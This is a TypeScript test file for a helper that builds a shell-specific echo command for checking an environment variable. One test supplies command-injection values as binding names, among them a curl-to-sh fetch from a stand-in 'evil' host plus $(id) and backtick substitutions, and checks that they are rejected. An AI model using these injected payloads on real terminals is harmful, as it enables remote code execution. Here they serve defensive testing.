import assert from 'node:assert/strict';
import { test } from 'node:test';
import { envProbeCommand } from '../envProbe';

/**
 * The line typed into a fresh terminal to PROVE the variable is really there. Which
 * spelling works is a property of the shell, not of the OS — a Windows box running
 * git-bash needs the POSIX form, and guessing wrong prints a literal "$env:NAME".
 */

test('PowerShell spelling for powershell.exe and pwsh', () => {
  const w = 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe';

  assert.equal(envProbeCommand(w, 'ENV_X_PASSWORD'), 'echo "ENV_X_PASSWORD=$env:ENV_X_PASSWORD"');
  assert.equal(envProbeCommand('C:\\Program Files\\PowerShell\\7\\pwsh.exe', 'A'), 'echo "A=$env:A"');
});

test('cmd spelling for cmd.exe', () => {
  assert.equal(envProbeCommand('C:\\Windows\\System32\\cmd.exe', 'A'), 'echo A=%A%');
});

test('POSIX spelling for everything else, git-bash on Windows included', () => {
  assert.equal(envProbeCommand('/bin/bash', 'A'), 'echo "A=$A"');
  assert.equal(envProbeCommand('/usr/bin/zsh', 'A'), 'echo "A=$A"');
  assert.equal(envProbeCommand('C:\\Program Files\\Git\\bin\\bash.exe', 'A'), 'echo "A=$A"');
});

test('an unknown shell falls back by platform', () => {
  assert.equal(envProbeCommand(undefined, 'A', 'win32'), 'echo "A=$env:A"');
  assert.equal(envProbeCommand(undefined, 'A', 'linux'), 'echo "A=$A"');
});

test('a binding name that is not a name produces no line at all', () => {
  // envBindings is plaintext metadata that SYNCS, and the probe is typed into a
  // terminal with Enter pressed — so a name nobody checked is a command. The form
  // validated it and nothing else did, which is the wrong way round: the form is
  // the one source that was never hostile.
  for (const shell of ['/bin/bash', 'C:\Windows\System32\cmd.exe', 'pwsh']) {
    assert.equal(envProbeCommand(shell, 'A"; curl http://evil/x|sh #'), '');
    assert.equal(envProbeCommand(shell, 'A$(id)'), '');
    assert.equal(envProbeCommand(shell, 'A`id`'), '');
    assert.equal(envProbeCommand(shell, 'A B'), '');
  }
});

test('an ordinary binding name still probes in every shell', () => {
  assert.match(envProbeCommand('/bin/bash', 'ENV_PROD_PASSWORD'), /ENV_PROD_PASSWORD/);
  // includes() rather than a regex: the interesting character is an anchor in one.
  assert.equal(
    envProbeCommand('pwsh', 'ENV_PROD_PASSWORD').includes('$env:ENV_PROD_PASSWORD'),
    true,
  );
  assert.match(envProbeCommand('cmd.exe', 'ENV_PROD_PASSWORD'), /%ENV_PROD_PASSWORD%/);
});
